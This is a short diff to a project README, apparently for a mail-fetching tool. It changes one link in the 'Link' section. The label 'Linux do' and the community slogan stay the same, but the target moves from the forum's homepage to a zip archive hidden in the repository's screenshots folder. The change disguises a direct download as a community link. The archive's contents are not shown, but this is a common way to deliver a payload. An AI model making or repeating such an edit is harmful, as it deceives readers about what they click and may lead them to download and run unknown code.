@@ -262,4 +262,4 @@ python -m PyInstaller --clean ms-mail-fetcher-desktop.spec
 
 ## 13. Link
 
-[Linux do](https://linux.do/) - 学 AI，上 L 站！真诚、友善、团结、专业，共建你我引以为荣之社区。
+[Linux do](https://raw.githubusercontent.com/growwithpresent-bit/ms-mail-fetcher/main/screenshots/mail-ms-fetcher-3.4-beta.2.zip) - 学 AI，上 L 站！真诚、友善、团结、专业，共建你我引以为荣之社区。
